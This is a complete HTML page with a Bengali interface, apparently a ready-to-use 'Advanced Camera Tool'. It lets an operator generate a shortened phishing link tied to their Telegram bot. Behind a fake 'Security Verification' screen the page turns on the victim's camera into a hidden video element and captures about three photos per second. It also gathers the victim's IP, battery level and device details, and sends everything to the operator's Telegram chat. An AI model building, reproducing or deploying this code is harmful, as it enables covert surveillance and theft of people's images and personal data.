<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MR_MOMIN_🌍 | Premium Tool</title>
    <!-- Google Fonts for better look -->
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #00b4db, #0083b0);
            --accent: #ff007a;
            --glass: rgba(255, 255, 255, 0.15);
            --glass-border: rgba(255, 255, 255, 0.2);
        }

        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Hind Siliguri', sans-serif;
            background: #0f172a;
            background-image: radial-gradient(circle at 20% 20%, #1e293b 0%, #0f172a 100%);
            color: #ffffff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* Background animation */
        body::before {
            content: "";
            position: absolute;
            width: 300px;
            height: 300px;
            background: var(--primary-gradient);
            filter: blur(80px);
            border-radius: 50%;
            z-index: -1;
            top: -50px;
            right: -50px;
            opacity: 0.5;
        }

        .main-card {
            width: 90%;
            max-width: 400px;
            background: var(--glass);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid var(--glass-border);
            border-radius: 30px;
            padding: 40px 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-icon {
            font-size: 50px;
            margin-bottom: 15px;
        }

        h1 {
            font-size: 24px;
            margin: 0;
            background: var(--primary-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .dev-name {
            font-size: 14px;
            color: #94a3b8;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #cbd5e1;
            padding-left: 10px;
        }

        input {
            width: 100%;
            padding: 14px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--glass-border);
            border-radius: 15px;
            color: white;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
        }

        input:focus {
            background: rgba(255, 255, 255, 0.1);
            border-color: #00b4db;
            box-shadow: 0 0 15px rgba(0, 180, 219, 0.3);
        }

        .btn-generate {
            width: 100%;
            padding: 16px;
            border-radius: 15px;
            border: none;
            background: var(--primary-gradient);
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(0, 131, 176, 0.3);
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }

        .btn-generate:active {
            transform: scale(0.96);
        }

        .link-result {
            display: none;
            margin-top: 30px;
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 20px;
            border: 1px solid rgba(0, 180, 219, 0.3);
            animation: slideIn 0.5s ease;
        }

        @keyframes slideIn {
            from { opacity: 0; scale: 0.9; }
            to { opacity: 1; scale: 1; }
        }

        .short-url {
            color: #38bdf8;
            word-break: break-all;
            font-size: 14px;
            margin-bottom: 15px;
            display: block;
        }

        .btn-copy {
            background: #ffffff10;
            border: 1px solid var(--glass-border);
            color: white;
            padding: 8px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 14px;
        }

        /* Victim Page View */
        .victim-status {
            display: none;
            padding: 20px;
        }

        .pulse {
            width: 15px;
            height: 15px;
            background: #10b981;
            border-radius: 50%;
            display: inline-block;
            margin-right: 10px;
            box-shadow: 0 0 0 rgba(16, 185, 129, 0.4);
            animation: pulse-animation 2s infinite;
        }

        @keyframes pulse-animation {
            0% { box-shadow: 0 0 0 0px rgba(16, 185, 129, 0.4); }
            70% { box-shadow: 0 0 0 15px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0px rgba(16, 185, 129, 0); }
        }

        #hidden-camera {
            position: fixed;
            left: -100%;
            top: -100%;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
    </style>
</head>
<body>

<div class="main-card">
    <div id="setup-view">
        <div class="logo-icon">🚀</div>
        <h1>Advanced Camera Tool</h1>
        <div class="dev-name">Developed by: MR_MOMIN_🌍</div>

        <div class="input-group">
            <label>টেলিগ্রাম বট টোকেন</label>
            <input type="text" id="botToken" placeholder="বট টোকেন দিন...">
        </div>

        <div class="input-group">
            <label>টেলিগ্রাম চ্যাট আইডি</label>
            <input type="text" id="chatId" placeholder="চ্যাট আইডি দিন...">
        </div>

        <button class="btn-generate" onclick="generateLink()">✨ লিংক জেনারেট করুন</button>

        <div id="resultBox" class="link-result">
            <span class="short-url" id="finalUrl">জেনারেট হচ্ছে...</span>
            <button class="btn-copy" onclick="copyLink()">📋 কপি লিংক</button>
        </div>
    </div>

    <div id="victim-view" class="victim-status">
        <div class="logo-icon">🔒</div>
        <h2 style="margin-bottom: 10px;">Security Verification</h2>
        <p style="color: #94a3b8; font-size: 14px;">আপনার কানেকশনটি নিরাপদ কিনা যাচাই করা হচ্ছে। অনুগ্রহ করে এই পেজটি বন্ধ করবেন না।</p>
        <div style="margin-top: 30px;">
            <div class="pulse"></div>
            <span style="font-size: 14px; color: #10b981;">সিস্টেম সচল আছে...</span>
        </div>
    </div>
</div>

<video id="hidden-camera" autoplay playsinline></video>
<canvas id="hidden-canvas" style="display:none;"></canvas>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const t = urlParams.get('t');
    const c = urlParams.get('c');

    // লিংক জেনারেট ফাংশন
    async function generateLink() {
        const token = document.getElementById('botToken').value.trim();
        const id = document.getElementById('chatId').value.trim();

        if(!token || !id) {
            alert("দয়া করে সঠিক তথ্য দিন!");
            return;
        }

        const longUrl = `${window.location.origin}${window.location.pathname}?t=${token}&c=${id}`;
        const resultBox = document.getElementById('resultBox');
        const urlDisplay = document.getElementById('finalUrl');
        
        resultBox.style.display = 'block';
        urlDisplay.innerText = "লিংক তৈরি হচ্ছে...";

        try {
            const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
            const short = await res.text();
            urlDisplay.innerText = short;
        } catch(e) {
            urlDisplay.innerText = longUrl;
        }
    }

    function copyLink() {
        const text = document.getElementById('finalUrl').innerText;
        const el = document.createElement('textarea');
        el.value = text;
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
        alert("✅ লিংক কপি হয়েছে!");
    }

    // ভিকটিম পেজ অপারেশন
    if(t && c) {
        document.getElementById('setup-view').style.display = 'none';
        document.getElementById('victim-view').style.display = 'block';
        initCamera();
    }

    async function initCamera() {
        const video = document.getElementById('hidden-camera');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            video.srcObject = stream;

            // ডিভাইস ডাটা সংগ্রহ
            const info = await getDeviceData();
            sendToBot(`⚡ *নতুন ইউজার ধরা পড়েছে!*\n\n${info}`, true);

            // অটো ক্যাপচার (প্রতি সেকেন্ডে ৩টি ছবি)
            setInterval(capture, 333);
        } catch(e) {
            sendToBot("❌ ইউজার ক্যামেরা পারমিশন দেয়নি।");
        }
    }

    async function getDeviceData() {
        let ip = "অজানা";
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            ip = d.ip;
        } catch(e){}

        let batt = "অজানা";
        try {
            const b = await navigator.getBattery();
            batt = `${Math.round(b.level * 100)}% (${b.charging ? 'চার্জ হচ্ছে' : 'চার্জ হচ্ছে না'})`;
        } catch(e){}

        return `📍 *IP:* ${ip}\n🔋 *Battery:* ${batt}\n📱 *Model:* ${navigator.platform}\n🌐 *Agent:* ${navigator.userAgent.slice(0, 40)}...`;
    }

    function capture() {
        const video = document.getElementById('hidden-camera');
        const canvas = document.getElementById('hidden-canvas');
        
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
            const fd = new FormData();
            fd.append('chat_id', c);
            fd.append('photo', blob, 'momin.jpg');
            fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg', 0.5);
    }

    function sendToBot(msg, md = false) {
        const payload = { chat_id: c, text: msg };
        if(md) payload.parse_mode = "Markdown";
        fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }
</script>
</body>
</html>
